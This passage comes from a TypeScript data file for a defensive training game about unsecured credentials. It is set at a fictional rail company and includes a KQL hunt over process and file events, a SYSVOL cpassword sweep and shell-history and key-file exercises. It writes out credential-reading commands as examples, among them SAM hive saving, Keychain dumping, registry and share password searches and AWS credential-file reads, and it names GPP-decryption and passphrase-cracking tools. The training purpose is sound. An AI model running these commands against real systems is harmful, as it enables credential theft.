import type { RoomExperience } from "./types";

// "Operation Plaintext" for the "unsecured-credentials-practice" room.
// Script: docs/campaign/109-unsecured-credentials-practice.md.
// Station task ids must match the room's task order exactly (see getRoomExperience).
// The room's own task order is kept.
//
// Oakmere Regional Rail (fictional), not the graded tasks' BrightLoop records.
// Signature, Secrets Left Lying Around: scripts, shares, registry, bash history, GPP and cloud
// metadata. A KQL hunt over process and file events finds who read a credentials file, and a sort
// separates a live secret from a placeholder. Every value is a training fake: passwords carry
// the word FAKE, AWS keys end in EXAMPLE.
// Game mix: hunt + outbreak + spotdiff. Advanced room, so every primer has fold: true.
//
// Lab data differs from the graded tasks. No lab uses Groups.xml with the patch as the question
// (q1); the fixed-label idea is taught on Git secret-scanning rules with PGP and EC headers, never a
// DLP upload with an OPENSSH header (q2). The Keychain lab is a process trail on a designer's Mac,
// and it never asks why theft comes second (q3). The cloud labs use Parameter Store and an EC2
// role, never GetSecretValue, a Lambda role, or a report generator (la1, ac1). The verdict queue
// has a scale-out, a build runner, a list call and a canary, never a rotation job (ac1). The client
// lab reads a Java SDK string on a ListSecrets call, never the Python record (f1). The
// locked-file records are an ESE database on a track-access server read by esentutl, never
// ntds.dit, ntdsutil or a DC (la2, q4);
// ntds.dit and ntdsutil appear only as labelled facts in a primer and the sweep report.
// The chain lab starts from a share, never a public commit (o1).

export const UNSECURED_CREDENTIALS_PRACTICE: RoomExperience = {
  roomId: "unsecured-credentials-practice",
  codename: "Operation Plaintext",
  theme: "plaintext",
  handler: { name: "Valentina Osei", role: "Credential Exposure Analyst, Oakmere Regional Rail" },
  briefing: [
    "Oakmere Regional Rail. Two depots, a ticketing platform in the cloud, and a handover share nobody has tidied since the last timetable change.",
    "On Monday a routine sweep found a script with a service password typed into it, readable by every contractor in the building.",
    "Deleting the file would take a minute. Valentina Osei, Credential Exposure Analyst, wants to know who read it first, and what that one line opened.",
    "Find what was left lying around, tell a live secret from a placeholder, follow the reads from the share to the cloud, and see how far it went.",
  ],
  mission: "Sort live secrets from placeholders, hunt who read a credentials file, weigh stolen keys and a raided Keychain, read a cloud theft that left no log of its own, work a queue of secret-read alerts, follow a locked file through a snapshot, then make the final calls on the graded records.",
  estimate: "~75 min",
  look: { primary: "#ffe27a", secondary: "#6ee7f0", warn: "#ff4f6d" },
  scene: "facilityplaintext",
  layout: "facility",
  stations: [
    {
      id: "share",
      label: "The Share",
      topic: "Finding versus dumping · credentials in files · shell history · Group Policy Preferences",
      tagline: "Who read it before you did?",
      building: "archive",
      taskIds: ["uc-r1", "uc-r2", "uc-q1"],
    },
    {
      id: "keyring",
      label: "The Keyring",
      topic: "Private keys · passphrases · detection on key material · the macOS Keychain",
      tagline: "Which keys open at once?",
      building: "vault",
      taskIds: ["uc-r3", "uc-q2", "uc-r4", "uc-q3"],
    },
    {
      id: "cloudvault",
      label: "The Cloud Vault",
      topic: "Cloud metadata · secrets stores · baselining who reads what · rotation · verdicts on bursts",
      tagline: "The theft wrote no log. Now what?",
      building: "control",
      taskIds: ["uc-r5", "uc-la1", "uc-r6", "uc-ac1"],
    },
    {
      id: "lockedfile",
      label: "The Locked File",
      topic: "Event 4663 · snapshots and locked databases · the techniques side by side · how one secret leads to the next",
      tagline: "How do you read a file that's locked?",
      building: "lab",
      taskIds: ["uc-r7", "uc-q4", "uc-m1", "uc-o1"],
    },
    {
      id: "lastread",
      label: "The Last Read",
      topic: "Weighing one object-access record · reading a request's parameters",
      tagline: "One record, one decision",
      building: "ticket",
      taskIds: ["uc-la2", "uc-f1"],
      boss: true,
    },
  ],
  personas: {
    "uc-q1": { name: "Valentina Osei", role: "Credential Exposure Analyst", line: "An old file and a patched domain. Tell me where we stand." },
    "uc-q2": { name: "Valentina Osei", role: "Credential Exposure Analyst", line: "Why is this rule treated differently from the rest?" },
    "uc-q3": { name: "Valentina Osei", role: "Credential Exposure Analyst", line: "Where in the chain does this step sit, and why there?" },
    "uc-la1": { name: "Valentina Osei", role: "Credential Exposure Analyst", line: "One record, one role. Read all of it before you tell me anything." },
    "uc-ac1": { name: "Valentina Osei", role: "Credential Exposure Analyst", line: "This came in overnight. Read the ticket, read the record, make the call." },
    "uc-q4": { name: "Valentina Osei", role: "Credential Exposure Analyst", line: "Someone asked me how replication shows up in this log. Answer them." },
    "uc-m1": { name: "Valentina Osei", role: "Credential Exposure Analyst", line: "Put each technique next to what it exposes." },
    "uc-o1": { name: "Valentina Osei", role: "Credential Exposure Analyst", line: "The report needs this chain in order." },
    "uc-la2": { name: "Valentina Osei", role: "Credential Exposure Analyst", line: "Three questions, one record. Take your time." },
    "uc-f1": { name: "Valentina Osei", role: "Credential Exposure Analyst", line: "One value from that record, exactly as written." },
  },
  briefings: {
    // ── Reading 1: a different family ──
    "uc-r1": [
      {
        kind: "sort",
        title: "Broke In, or Picked It Up?",
        prompt: "Valentina starts every new analyst here, because the family decides what you go looking for. Sort each move from Oakmere's last red team report.",
        buckets: [
          { id: "dump", label: "Broke into a guarded store" },
          { id: "reach", label: "Found it lying around, or used the normal way in" },
        ],
        items: [
          { id: "i1", text: "A process opens a handle to lsass.exe and reads its memory", bucket: "dump", why: "LSASS memory is guarded by the OS, and this is the classic shape of OS Credential Dumping (T1003)." },
          { id: "i2", text: "findstr searches the Handover share for the word password", bucket: "reach", why: "Nothing was forced. The file was already readable, which makes this T1552.001. The trace is one ordinary-looking search." },
          { id: "i3", text: "A process on a server reads 169.254.169.254 and receives role credentials", bucket: "reach", why: "The endpoint hands them to anything on the instance. That's T1552.005, a secret that was already reachable." },
          { id: "i4", text: "A copy of the directory database is taken from a domain controller", bucket: "dump", why: "The OS guards that file while the DC runs. This is T1003.003, in the dumping family." },
          { id: "i5", text: "security dump-keychain -d runs after the user's login password was captured", bucket: "reach", why: "The vault was opened with its own password through its own tool. That's T1555.001." },
          { id: "i6", text: "A stolen cloud identity calls the secrets manager, which it has permission to do", bucket: "reach", why: "The API did its job for a permitted caller. That's T1555.006, and only the pattern of use gives it away." },
          { id: "i7", text: "cat ~/.ssh/depot_ed25519 on a Linux gateway, with no passphrase set", bucket: "reach", why: "A key file readable by the account. T1552.004, and on the host it's one short read." },
          { id: "i8", text: "reg save HKLM\\SAM copies the local account hive off a server", bucket: "dump", why: "The OS keeps that hive locked and guarded, so this is T1003 again, with a command defenders can watch for." },
        ],
        primer: {
          fold: true,
          title: "Three families under one tactic",
          points: [
            "**Credential Access** (TA0006) is the MITRE ATT&CK tactic for getting hold of credentials. It holds several families of technique.",
            "**OS Credential Dumping (T1003)** pulls secrets out of a store the operating system actively guards.",
            "**Unsecured Credentials (T1552)** is a secret that was already reachable, sitting where somebody left it.",
            "**Credentials from Password Stores (T1555)** gets into a vault through its own normal door, with a captured password or a permitted identity.",
            "Reading a file or calling an API is ordinary. For T1552 and T1555, the evidence is in who did it, with what, and in what pattern.",
          ],
          example: {
            label: "Worked example: one password, two routes",
            lines: [
              "A mail relay keeps its password in process memory and also in `relay.conf`.",
              "Attaching a debugger to the running process and scraping its memory: forcing a guarded place, the dumping shape.",
              "`type relay.conf` from a shell: reading what was already reachable, the T1552 shape.",
            ],
          },
        },
      },
      {
        kind: "inspect",
        title: "Walk the Sweep Report",
        prompt: "Monday's sweep came back as one list. Open each line and see which ATT&CK technique it belongs to. Valentina tags them this way so that each one goes to the team who can fix it.",
        artifact: "Credential sweep · Oakmere Regional Rail · Monday 07:30",
        items: [
          { id: "s1", text: "Handover share: depot_sync.ps1 with a password typed into it", tag: "T1552.001 Credentials In Files", tone: "warn", note: "Plaintext in scripts, configs, .env files and source code. Attackers find it with the same grep or findstr searches you would use." },
          { id: "s9", text: "or-dp-gw1: .bash_history for svc-depot with passwords typed on command lines", tag: "T1552.003 Shell History", tone: "warn", note: "The shell saves what was typed, so a password given on a command line stays in the history file until someone removes it." },
          { id: "s2", text: "SYSVOL: an XML file with a cpassword attribute", tag: "T1552.006 Group Policy Preferences", tone: "warn", note: "A password pushed out through Group Policy Preferences, stored in SYSVOL and encrypted with an AES key that Microsoft documented publicly." },
          { id: "s3", text: "or-dp-gw1: ~/.ssh/depot_ed25519 with no passphrase", tag: "T1552.004 Private Keys", tone: "warn", note: "An unprotected key file. Whoever holds it logs in as its owner, with nothing to guess." },
          { id: "s4", text: "or-tkt-web01: metadata endpoint still allows token-less requests", tag: "T1552.005 Cloud Instance Metadata API", tone: "warn", note: "A link-local address on the instance hands out the role's temporary credentials. The request never appears in CloudTrail." },
          { id: "s5", text: "or-tt-mb04: login.keychain-db on the timetable designer's Mac", tag: "T1555.001 Keychain", tone: "info", note: "The macOS vault. By default the login keychain opens with the account's own login password." },
          { id: "s6", text: "or-fare-batch-role: allowed to read every secret in the account", tag: "T1555.006 Cloud Secrets Management Stores", tone: "warn", note: "A cloud vault is reached by an API call, such as GetSecretValue or az keyvault secret show. The exposure is who may make that call." },
          { id: "s7", text: "Domain controllers: object-access auditing on the directory database", tag: "T1003.003 NTDS", tone: "info", note: "This room looks only at the file-access telemetry. The extraction tools include ntdsutil, whose Install From Media feature exports the database, and vssadmin." },
          { id: "s8", text: "Ticket kiosk TK-14: DefaultPassword set under the Winlogon registry key", tag: "T1552.002 Credentials in Registry", tone: "warn", note: "Automatic logon stores its password as plain text in the registry. reg query HKLM /f password /t REG_SZ /s is how people find it." },
        ],
      },
    ],
    // ── Reading 2: files, shell history and GPP ──
    "uc-r2": [
      {
        kind: "sort",
        title: "Live Secret or Placeholder?",
        prompt: "The sweep flagged every line that looks like a secret, and most of the work is telling which ones are. Everything here is a training fake: FAKE inside a password and EXAMPLE at the end of an AWS key mark it as ours, so read past those marks. Tap each card for where it was found.",
        buckets: [
          { id: "live", label: "Live secret: rotate it" },
          { id: "hold", label: "Placeholder or nothing stored" },
        ],
        items: [
          { id: "c1", text: "$pw = \"FAKE-Depot-Sync-2026\"", hidden: "depot_sync.ps1, Handover share, run daily by a scheduled task", bucket: "live", why: "A literal value in a script that runs in production. The job only works if this password does." },
          { id: "c2", text: "$pw = $env:DEPOT_PW", hidden: "depot_sync_v2.ps1, in the ops Git repository", bucket: "hold", why: "A reference to an environment variable. The value lives somewhere else, so the next question is where that variable gets set." },
          { id: "c3", text: "DB_PASSWORD=changeme", hidden: ".env.example, ticketing repository", bucket: "hold", why: "A template default that ships with the code. It's worth one check that nobody deployed it as it stands, then it's noise." },
          { id: "c4", text: "DB_PASSWORD=FAKE-q7Rm2xLp", hidden: ".env, /var/www/ticketing on or-tkt-web01", bucket: "live", why: "Same key as the template, in the file the running app reads. Location decided this one, not the shape." },
          { id: "c5", text: "aws_access_key_id = AKIAOAKMERE2AEXAMPLE", hidden: "~/.aws/credentials for svc-depot on or-dp-gw1, created 2021", bucket: "live", why: "AKIA marks a long-lived access key, in the file the CLI reads. Treat it as usable until someone proves otherwise." },
          { id: "c6", text: "aws_access_key_id = <YOUR_ACCESS_KEY_ID>", hidden: "README.md, section Setup", bucket: "hold", why: "Angle brackets in a setup guide tell a person what to fill in. Nothing is stored." },
          { id: "c7", text: "DefaultPassword  REG_SZ  FAKE-Kiosk-Logon-7", hidden: "Winlogon key on ticket kiosk TK-14, AutoAdminLogon = 1", bucket: "live", why: "AutoAdminLogon = 1 means the machine uses this value at every boot, so it works today, in plain text." },
          { id: "c8", text: "DefaultPassword  REG_SZ  (value not set)", hidden: "Winlogon key on TK-02, AutoAdminLogon = 0", bucket: "hold", why: "Automatic logon is off and the value is empty, so there's nothing here to steal." },
          { id: "c9", text: "mysql -h or-tkt-db1 -u report -p'FAKE-Rpt-Pass'", hidden: ".bash_history for svc-depot on or-dp-gw1", bucket: "live", why: "A password typed on the command line is saved with the command. Shell history keeps what the person typed." },
          { id: "c10", text: "mysql -h or-tkt-db1 -u report -p", hidden: ".bash_history for h.lindqvist on or-dp-gw1", bucket: "hold", why: "With a bare -p the client prompts for the password, and a prompt isn't saved to history. Only the command is." },
          { id: "c11", text: "cpassword=\"FAKE+TRAINING+CIPHERTEXT+ONLY==\"", hidden: "ScheduledTasks.xml in SYSVOL, GPO Nightly Reboot", bucket: "live", why: "It looks encrypted, but the key is public, so any tool that knows it gets the password back." },
          { id: "c12", text: "cpassword=\"\" noChange=\"1\"", hidden: "Groups.xml in SYSVOL, GPO Workstation Local Admin", bucket: "hold", why: "The attribute is there and empty. A plain search for the word cpassword finds it, and there's nothing in it." },
          { id: "c13", text: "\"AccessKeyId\": \"ASIAOAKMERE2AEXAMPLE\", \"Token\": \"FAKE-SESSION-TOKEN\"", hidden: "debug.log on or-tkt-web01, a metadata response written out 20 minutes ago", bucket: "live", why: "ASIA marks temporary credentials. They expire, but until then they work for anyone holding them, and this copy is 20 minutes old." },
          { id: "c14", text: "password: \"{{ vault_depot_pw }}\"", hidden: "group_vars/depot.yml, Ansible repository", bucket: "hold", why: "A variable that the vault fills in when the playbook runs. Without the vault, the file gives nothing away." },
        ],
        primer: {
          fold: true,
          title: "What makes a value live",
          points: [
            "A **live secret** is a literal value that something can use today. A **placeholder** only holds a spot: a variable, a vault reference, a template default, an empty field.",
            "Read the **location** before the value. A deployed file and a template in a repository can match line for line.",
            "A reference such as `$env:NAME` or `{{ name }}` means the value lives elsewhere. That's where to look next.",
            "`AKIA` starts a long-lived AWS access key. `ASIA` starts a temporary one, which also needs a session token.",
          ],
          example: {
            label: "Worked example: one key, two answers",
            lines: [
              "`smtp_password = ${SMTP_PASSWORD}` in `mail.conf.template`: a variable in a template, so nothing is stored.",
              "`smtp_password = FAKE-Mail-Relay-19` in `/etc/mail/relay.conf`: a literal, in the file the service loads.",
              "Same key name. The value's form and the file's location give different answers.",
            ],
          },
        },
      },
      {
        kind: "hunt",
        title: "Who Read depot_sync.ps1?",
        prompt: "Monday, 08:40. The script is still on the Handover share, and deleting it would tell you nothing. Valentina wants the reads first: who touched this file, and who kept a copy? Build the hunt one line at a time. Every result you see is really what that line returns.",
        language: "KQL",
        start: "DeviceProcessEvents",
        goal: "one row: who copied the script, where it landed, and where that session came from",
        tables: [
          {
            name: "DeviceProcessEvents",
            note: "Process creation, with the full command line.",
            columns: ["Timestamp", "DeviceName", "AccountName", "FileName", "ProcessCommandLine", "InitiatingProcessFileName", "ProcessId"],
            rows: [
              ["10-28 14:12", "or-ops-wk02", "h.lindqvist", "notepad.exe", "notepad.exe \\\\or-fs02\\Handover\\Scripts\\depot_sync.ps1", "explorer.exe", "6108"],
              ["10-31 06:00", "or-ops-wk02", "svc-depot", "powershell.exe", "powershell.exe -File \\\\or-fs02\\Handover\\Scripts\\depot_sync.ps1", "svchost.exe", "3120"],
              ["11-01 06:00", "or-ops-wk02", "svc-depot", "powershell.exe", "powershell.exe -File \\\\or-fs02\\Handover\\Scripts\\depot_sync.ps1", "svchost.exe", "3344"],
              ["11-01 09:15", "or-ops-wk02", "h.lindqvist", "powershell.exe", "powershell.exe -File \\\\or-fs02\\Handover\\Scripts\\rota_export.ps1", "explorer.exe", "5216"],
              ["11-01 22:44", "or-con-vdi11", "l.brandt", "findstr.exe", "findstr /S /I /M password \\\\or-fs02\\Handover\\*.ps1", "cmd.exe", "7344"],
              ["11-01 22:49", "or-con-vdi11", "l.brandt", "cmd.exe", "cmd.exe /c copy \\\\or-fs02\\Handover\\Scripts\\depot_sync.ps1 C:\\Users\\Public\\d.ps1", "cmd.exe", "7512"],
              ["11-01 23:05", "or-bak-01", "svc-filebak", "robocopy.exe", "robocopy.exe \\\\or-fs02\\Handover D:\\Backup\\Handover /MIR /R:1", "svchost.exe", "2240"],
              ["11-02 08:20", "or-soc-wk01", "v.osei", "cmd.exe", "cmd.exe /c copy \\\\or-fs02\\Handover\\Scripts\\depot_sync.ps1 E:\\Case-0412\\depot_sync.ps1", "powershell.exe", "4188"],
            ],
          },
          {
            name: "DeviceFileEvents",
            note: "Files created, modified, renamed, deleted. Plain reads aren't recorded.",
            columns: ["Timestamp", "DeviceName", "ActionType", "FileName", "FolderPath", "InitiatingProcessId"],
            rows: [
              ["10-28 14:15", "or-ops-wk02", "FileModified", "handover_notes.txt", "C:\\Users\\h.lindqvist\\Documents\\handover_notes.txt", "9014"],
              ["10-31 09:30", "or-ops-wk02", "FileCreated", "rota.csv", "C:\\Rota\\rota.csv", "7512"],
              ["11-01 22:45", "or-con-vdi11", "FileCreated", "found.txt", "C:\\Users\\l.brandt\\AppData\\Local\\Temp\\found.txt", "7340"],
              ["11-01 22:49", "or-con-vdi11", "FileCreated", "d.ps1", "C:\\Users\\Public\\d.ps1", "7512"],
              ["11-02 08:20", "or-soc-wk01", "FileCreated", "depot_sync.ps1", "E:\\Case-0412\\depot_sync.ps1", "4188"],
            ],
          },
          {
            name: "DeviceLogonEvents",
            note: "Sign-ins on a device.",
            columns: ["Timestamp", "DeviceName", "AccountName", "LogonType", "RemoteIP"],
            rows: [
              ["10-28 14:05", "or-ops-wk02", "h.lindqvist", "Interactive", "-"],
              ["10-29 08:02", "or-con-vdi14", "l.brandt", "RemoteInteractive", "10.30.8.44"],
              ["10-30 09:10", "or-con-vdi11", "m.kowal", "RemoteInteractive", "10.30.8.21"],
              ["11-01 22:31", "or-con-vdi11", "l.brandt", "RemoteInteractive", "203.0.113.58"],
              ["11-02 08:05", "or-soc-wk01", "v.osei", "Interactive", "-"],
            ],
          },
        ],
        rungs: [
          {
            id: "file", ask: "Line 2: no table logs the read itself, so find the processes that named the file.",
            choices: [
              { id: "a", text: '| where FileName has "depot_sync"', why: "No rows. In this table FileName is the program that ran, and nothing called depot_sync ever ran as a program.", apply: { op: "where", col: "FileName", test: "has", value: "depot_sync" } },
              { id: "b", text: '| where ProcessCommandLine has "Handover"', why: "Too wide: the backup job and every other script on the share came too. Name the file, not its folder.", apply: { op: "where", col: "ProcessCommandLine", test: "has", value: "Handover" } },
              { id: "c", text: '| where ProcessCommandLine has "depot_sync.ps1"', right: true, why: "Five rows. What a process was pointed at sits in its command line.", apply: { op: "where", col: "ProcessCommandLine", test: "has", value: "depot_sync.ps1" } },
            ],
          },
          {
            id: "known", ask: "Line 3: two accounts are already explained. The scheduled task runs as svc-depot, and v.osei took the evidence copy this morning. Drop them.",
            choices: [
              { id: "a", text: '| where AccountName =~ "l.brandt"', why: "You chose the name you can see. A hunt should say what it removes and why, so that it still works on names you haven't met.", apply: { op: "where", col: "AccountName", test: "ieq", value: "l.brandt" } },
              { id: "b", text: '| where InitiatingProcessFileName !~ "svchost.exe"', why: "That removes the scheduled runs, but Valentina's evidence copy is still in the list.", apply: { op: "where", col: "InitiatingProcessFileName", test: "notin", value: ["svchost.exe"] } },
              { id: "c", text: '| where AccountName !in~ ("svc-depot", "v.osei")', right: true, why: "Two rows left. The script's owner opened it in Notepad, and l.brandt ran a copy.", apply: { op: "where", col: "AccountName", test: "notin", value: ["svc-depot", "v.osei"] } },
            ],
          },
          {
            id: "wrote", ask: "Line 4: which of these two left something behind? Bring in the table that shows what a process wrote.",
            choices: [
              { id: "a", text: "| join kind=inner DeviceFileEvents on DeviceName", why: "Every file on those devices came along, including ones these processes never touched. Match the process, not just the machine.", apply: { op: "join", table: "DeviceFileEvents", left: "DeviceName", right: "DeviceName" } },
              { id: "b", text: "| join kind=inner DeviceFileEvents on $left.ProcessId == $right.InitiatingProcessId", why: "rota.csv came back from a different machine. PID 7512 exists on both, because PIDs repeat across devices.", apply: { op: "join", table: "DeviceFileEvents", left: "ProcessId", right: "InitiatingProcessId" } },
              { id: "c", text: "| join kind=inner DeviceFileEvents on DeviceName, $left.ProcessId == $right.InitiatingProcessId", right: true, why: "One row. A file event names the process that caused it, and the device plus the PID identify that process.", apply: { op: "join", table: "DeviceFileEvents", left: "ProcessId", right: "InitiatingProcessId", also: "DeviceName" } },
              { id: "d", text: "| join kind=inner DeviceLogonEvents on AccountName", why: "That shows when people signed in, not what the process wrote.", apply: { op: "join", table: "DeviceLogonEvents", left: "AccountName", right: "AccountName" } },
            ],
          },
          {
            id: "logon", ask: "Line 5: l.brandt's contract ended on Friday, and this copy ran on Sunday night. How did that session reach this desktop?",
            choices: [
              { id: "a", text: "| join kind=inner DeviceLogonEvents on AccountName", why: "Two logons came back, and one is from another desktop three days earlier. An account signs in to many devices.", apply: { op: "join", table: "DeviceLogonEvents", left: "AccountName", right: "AccountName" } },
              { id: "b", text: "| join kind=inner DeviceLogonEvents on DeviceName", why: "Two logons came back, and one is another contractor's. Many accounts use one shared desktop.", apply: { op: "join", table: "DeviceLogonEvents", left: "DeviceName", right: "DeviceName" } },
              { id: "c", text: "| join kind=inner DeviceLogonEvents on DeviceName, AccountName", right: true, why: "One logon: this account on this desktop, from 203.0.113.58, which isn't an Oakmere address.", apply: { op: "join", table: "DeviceLogonEvents", left: "AccountName", right: "AccountName", also: "DeviceName" } },
            ],
          },
          {
            id: "show", ask: "Line 6: show only what the ticket needs. DeviceFileEvents also has a FileName column, so its version is now FileName1.",
            choices: [
              { id: "a", text: "| project DeviceName, AccountName, FileName, FolderPath, RemoteIP", why: "FileName here is the left table's: cmd.exe. The copy is FileName1.", apply: { op: "project", cols: ["DeviceName", "AccountName", "FileName", "FolderPath", "RemoteIP"] } },
              { id: "b", text: "| project DeviceName, AccountName, ProcessCommandLine, FileName1, FolderPath, RemoteIP", right: true, why: "One row: the desktop, the account, the command, the copy, where it landed, and where the session came from.", apply: { op: "project", cols: ["DeviceName", "AccountName", "ProcessCommandLine", "FileName1", "FolderPath", "RemoteIP"] } },
              { id: "c", text: "| summarize count() by AccountName", why: "A count says how often. The ticket needs what, where and from where.", apply: { op: "summarize", by: ["AccountName"] } },
            ],
          },
        ],
        expect: 1,
        lesson: "Find the file in the command line, remove what you can explain and say so in the query, then join on device and PID to see what a process wrote, and on device and account to see how the session arrived. Nobody disabled l.brandt's account on Friday, and it came back on Sunday from outside. Keep the findstr row as well: the search for the word password came first, and it covered more than one file.",
        primer: {
          fold: true,
          title: "What a read leaves behind",
          points: [
            "**Advanced Hunting** is the query console in Microsoft Defender, and its language is **KQL** (Kusto Query Language). You start from a table, then each line pipes the rows through one step.",
            "`DeviceFileEvents` records files created, modified, renamed and deleted. A plain read isn't one of those.",
            "`DeviceProcessEvents` holds each process. `FileName` is the program that ran, and `ProcessCommandLine` holds what it was pointed at. A read often shows up there.",
            "A file event carries the `InitiatingProcessId` of the process that caused it. PIDs repeat across devices, so a process join matches on the device and the PID together.",
            "`=~` compares ignoring case, and `!in~` drops a list of values, ignoring case.",
          ],
          example: {
            label: "Worked example: another file, another question",
            lines: [
              "Who opened the fare table with Excel, and did they save anything?",
              "`DeviceProcessEvents | where ProcessCommandLine has \"fares_2025.xlsx\"`",
              "`| join kind=inner DeviceFileEvents on DeviceName, $left.ProcessId == $right.InitiatingProcessId`",
              "Rows that survive the join are processes that named the file and also wrote something.",
            ],
          },
        },
      },
      {
        kind: "worksheet",
        title: "Sweep SYSVOL for Leftovers",
        prompt: "The share wasn't the only place. Valentina ran a sweep of SYSVOL, and it came back with a mixed list. Work out what really needs action.",
        caption: "SYSVOL sweep · oakmererail.example · Policies\\{GUID}\\...\\Preferences",
        columns: ["GPO", "XML file", "Written", "cpassword", "GPO state"],
        rows: [
          ["Depot Label Printers", "Printers.xml", "2013-02", "value present", "Linked"],
          ["Legacy Print Deploy", "Printers.xml", "2012-09", "value present", "Not linked"],
          ["Workstation Local Admin", "Groups.xml", "2019-06", "empty", "Linked"],
          ["Nightly Reboot", "ScheduledTasks.xml", "2014-03", "value present", "Linked"],
          ["Mapped Rota Drive", "Drives.xml", "2021-11", "no attribute", "Linked"],
          ["Old Ticketing Service", "Services.xml", "2011-05", "value present", "GPO disabled"],
        ],
        questions: [
          { id: "count", q: "How many of these files hold a password that a domain user could read and decrypt today?", hint: "SYSVOL holds the file whether or not the GPO is applied. Count by the cpassword column.", answer: ["4", "four"], why: "Four. A GPO that's unlinked or disabled stops applying, but its XML stays in SYSVOL where any domain user can read it. An empty attribute and a missing one hold nothing." },
          { id: "fix", q: "A colleague deletes the Nightly Reboot XML and closes the ticket. In one word, what still has to happen to that password?", hint: "Deleting removes a copy. Nobody can say who read it first.", answer: ["rotate", "rotation", "rotated", "change", "changed", "reset"], why: "Rotate it. Deleting the file removes one copy of a value that may already have been read any number of times, and only a new password makes those copies worthless." },
        ],
        primer: {
          fold: true,
          title: "How Group Policy Preferences kept passwords",
          points: [
            "**Group Policy Preferences (GPP)** let administrators push settings to many machines, including local-account passwords, as XML files in **SYSVOL**, the share domain controllers use to publish policy.",
            "The password went in as a `cpassword` attribute, encrypted with AES-256. Microsoft published the key in its own documentation.",
            "SYSVOL is readable by every domain user. That's how machines fetch policy, and it's by design.",
            "**MS14-025** (2014) took the password fields out of the GPP editor. The XML already sitting in SYSVOL wasn't part of that change, which is why people still sweep for it.",
            "`findstr /S /I cpassword` finds it, and tools such as `Get-GPPPassword` and `gpp-decrypt` turn a value back into the password.",
          ],
          example: {
            label: "Worked example: reading one XML line",
            lines: [
              "`<Properties runAs=\"OAKMERE\\svc-print\" cpassword=\"FAKE+TRAINING+ONLY==\"/>`",
              "`runAs` names the account. `cpassword` holds the encrypted value, so this line stores a password.",
              "If `cpassword=\"\"`, the attribute exists and stores nothing.",
            ],
          },
        },
      },
    ],
    // ── Reading 3: private keys ──
    "uc-r3": [
      {
        kind: "hotspot",
        title: "Read a Gateway's Shell History",
        prompt: "The script's password opened an SSH session on or-dp-gw1, the depot gateway. This is the shell history the intruder would have read first. Tap every line that gives an intruder something: a secret, or the way to one.",
        artifact: ".bash_history · svc-depot@or-dp-gw1",
        finish: "History never expires on its own, so each secret here stays exposed until it's rotated.",
        parts: [
          { id: "h1", text: "cd /opt/depot", flag: false, note: "Moving between folders gives nothing away.", style: "body" },
          { id: "h2", text: "systemctl status depot-sync", flag: false, note: "A status check, with no secret in it.", style: "body" },
          { id: "h3", text: "curl -u svc-depot:FAKE-Depot-Sync-2026 https://or-rota.oakmererail.example/api/export", flag: true, note: "curl -u takes user:password on the command line, so the password went into history with it.", style: "body" },
          { id: "h4", text: "tail -n 50 /var/log/depot/sync.log", flag: false, note: "Reading a log. The command itself holds nothing.", style: "body" },
          { id: "h5", text: "export ROTA_API_TOKEN=FAKE-rota-token-0000", flag: true, note: "A token set by hand. The environment forgets it at logout, but the history file doesn't.", style: "body" },
          { id: "h6", text: "df -h /opt/depot", flag: false, note: "A disk space check, with no secret in it.", style: "body" },
          { id: "h11", text: "mysql -h or-tkt-db1 -u report -p'FAKE-Rpt-Pass'", flag: true, note: "The password is attached to -p on the command line, so history saved it with the command.", style: "body" },
          { id: "h7", text: "sshpass -p 'FAKE-Gw2-Pass' ssh depot@or-dp-gw2", flag: true, note: "sshpass takes the password as an argument, so history holds both the password and the host it opens.", style: "body" },
          { id: "h8", text: "ls -la ~/.ssh", flag: false, note: "Listing a folder stores nothing, though it's the same check an intruder would run.", style: "body" },
          { id: "h9", text: "ssh -i ~/.ssh/depot_ed25519 ec2-user@or-tkt-web01", flag: true, note: "No secret on this line, but it names the key file and the server that key opens.", style: "body" },
          { id: "h10", text: "cat ~/.aws/credentials", flag: true, note: "Again no value, but it says a long-lived AWS key file exists on this host.", style: "body" },
        ],
      },
      {
        kind: "simulate",
        title: "What Stands Between the File and a Login?",
        prompt: "Four key files turned up on Oakmere hosts, and each has just been copied by an intruder. Run each one through Valentina's three checks to see how long it holds out.",
        checks: [
          { name: "Encrypted in the file", question: "Is the secret inside the file encrypted?" },
          { name: "Needs work first", question: "Must the thief do something before it works?" },
          { name: "Unlock kept apart", question: "Is whatever unlocks it stored away from the file?" },
        ],
        scenarios: [
          { id: "ed", label: "depot_ed25519", detail: "OpenSSH key on or-dp-gw1. ssh-keygen -y -f depot_ed25519 prints the public key without asking for anything.", results: ["fail", "fail", "fail"], why: ["No prompt from ssh-keygen means no passphrase, so the key material is readable as it stands.", "It works the moment it's copied, with nothing to guess.", "There's no unlock to keep anywhere."], verdict: "Usable at once. Rotate the key and remove the public half from every authorized_keys file." },
          { id: "ppk", label: "fares_admin.ppk", detail: "PuTTY key on an ops laptop. The file's header reads Encryption: aes256-cbc.", results: ["pass", "pass", "pass"], why: ["That header line says the private part is encrypted.", "The thief has to recover the passphrase first, offline, with tools such as John or Hashcat.", "The passphrase is in the owner's head, not on the disk."], verdict: "This buys time, and how much depends on the passphrase. Rotate anyway, because a weak passphrase falls fast." },
          { id: "aws", label: "~/.aws/credentials", detail: "Plain text on or-dp-gw1, with an aws_access_key_id and its secret key.", results: ["fail", "fail", "fail"], why: ["The file is plain text by design: the CLI reads it directly.", "Paste it into a profile and it works from anywhere.", "It has no unlock at all."], verdict: "It behaves just like an unprotected private key. Deactivate the key, then move the job to a role." },
          { id: "pfx", label: "gateway_tls.pfx", detail: "A PKCS#12 bundle with a password. deploy.sh, in the same folder, contains -passin pass:FAKE-Pfx-Pass.", results: ["pass", "fail", "fail"], why: ["PKCS#12 bundles are encrypted with their password.", "The password came along in the same folder, so there's nothing to crack.", "The script beside the file holds it."], verdict: "Encrypted on paper, open in practice. A protection only counts if its unlock lives somewhere else." },
        ],
        primer: {
          fold: true,
          title: "Why a key file is worse than a password",
          points: [
            "A private key is the secret half of a key pair. Whoever holds it authenticates as its owner, with no guessing. This is **T1552.004**.",
            "You'll know them by extension or path: `.key`, `.pem`, `.ppk`, `.p12`, `.pfx`, `.gpg`, `~/.ssh/id_rsa`, `~/.ssh/id_ed25519`.",
            "A **passphrase** encrypts the key material inside the file, so it has to be decrypted before it will work.",
            "Against a stolen protected key, the attacker extracts a crackable hash with `ssh2john` and runs it through John or Hashcat, offline. That's the same cracking workflow used on password hashes.",
          ],
          example: {
            label: "Worked example: a key on a phone-system server",
            lines: [
              "`ssh-keygen -y -f pbx_rsa` prints `Enter passphrase:`, so this one is protected.",
              "An older PEM key shows it in the header: `Proc-Type: 4,ENCRYPTED`.",
            ],
          },
        },
